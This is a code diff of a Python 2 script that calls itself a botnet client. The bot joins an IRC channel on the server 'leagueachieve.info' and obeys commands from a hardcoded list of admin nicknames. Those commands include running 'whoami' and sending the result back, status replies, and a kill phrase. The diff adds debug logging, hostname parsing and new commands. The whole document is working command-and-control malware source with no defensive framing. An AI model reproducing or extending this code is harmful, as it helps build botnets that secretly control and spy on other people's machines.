@@ -14,38 +14,49 @@ import time
 import platform
 import os
 import subprocess as sub
+from sys import argv
 from random import randint
 
 def genNick():
 	flavor = execute('uname')
-	rannum = str(randint(000, 999))
-	nick = str(flavor) + str(rannum)
-	return str(nick)
+	rannum = str(randint(0000, 9999))
+	return str(flavor[:3] + rannum)
 
 def execute(cmd):
 	p = sub.Popen(cmd,stdout=sub.PIPE,stderr=sub.PIPE)
 	output, errors = p.communicate()
 	return output.strip('\n');
 
+DEBUG = 0
+if len(argv) > 1 and (argv[1] == "-d" or argv[1] == "--debug"):
+	DEBUG = 1
+
 #IRC Settings
 admins = ["king", "samorizu", "blackbear", "bigshebang"]
 server = "leagueachieve.info"
+port = 6667
 channel = "#lobby"
 botnick = genNick()
 
 print botnick
 
 #All of the possible functions that the botnet is capable of
-def iAmHere(): #send back to IRC server that you are here
+def reply(): #send back to IRC server that you are here
 	irc.send('PRIVMSG ' + channel + " :Yes I am here" + '\r\n')
 
-def iAmThis():
+def whoAmI(): #execute whoami command and send output
 	cmd  = execute("whoami")
 	irc.send('PRIVMSG ' + channel + " :" + cmd + '\r\n')
 
 def iAmGood(): #send back to IRC server that you are good
 	irc.send('PRIVMSG ' + channel + " :I am good. And you?" + '\r\n')
 
+def getAge(): #send uptime
+	irc.send('PRIVMSG ' + channel + " :I don't know how to do that yet boss." + '\r\n')
+
+def terminate(): #terminate program and send goodbye message
+	irc.send('PRIVMSG ' + channel + " :Oh no! We better find some cover." + '\r\n')
+	exit()
 
 #function that handles multiple-line output
 #def multipleLines():
@@ -57,17 +68,28 @@ def iAmGood(): #send back to IRC server that you are good
 
 #dictionary of functions
 commands = {
-	"are you there" : iAmHere,
+	"are you there" : reply,
 	"how are you" : iAmGood,
-	"who are you" : iAmThis
+	"who are you" : whoAmI,
+	"how old are you" : getAge,
+	"zombie apocalypse" : terminate
 }
 
 #function which parses the command and determine how to handle it
 def parseCommand(command):
+	if DEBUG:
+		print "command is '%s'" % command
 	arg = "PRIVMSG"
 	if (arg in command):
-		user = command[1:command.index("!~")]
-		# print "user is '%s'" % user
+		user = command[1:command.index("!~")] #user sending message
+		host = command[(command.index("!~") + 2):command.index(" ")] #hostname and ip/domain name: 'blarg@1.2.3.4'
+		hostname = host[:host.index("@")] #hostname: 'blarg'
+		client = host[(host.index("@") + 1):] #client/ip/domain name: '1.2.3.4' or 'blarg.com'
+		if DEBUG:
+			print "user is '%s'" % user
+			print "host is '%s'" % host
+			print "hostname is '%s'" % hostname
+			print "client is '%s'" % client
 		if user in admins:
 			tempCommand = command[command.index(arg):]
 			command = tempCommand[(tempCommand.index(':') + 1):].strip().lower()
@@ -85,15 +107,20 @@ def parseCommand(command):
 #Connecting to the IRC Server
 irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
 print "connecting to: "+server
-irc.connect((server, 6667)) #connects to the server
+irc.connect((server, port)) #connects to the server
 irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :This is a fun bot!\n") #user authentication
 irc.send("NICK "+ botnick +"\n") #sets nick
 
 temp=irc.recv(4096) #get response to setting nick
+if DEBUG:
+		print "text received: '%s'" % temp
+
 counter = 2
 while "nickname already in use" in temp.lower():
 	irc.send("NICK " + botnick + "-" + str(counter) + "\n") #sets nick
 	temp=irc.recv(4096) #get response to setting nick
+	if DEBUG:
+		print "text received: '%s'\niteration %d" % (temp, counter)
 	counter += 1
 
 irc.send("PRIVMSG nickserv :iNOOPE\r\n") #auth
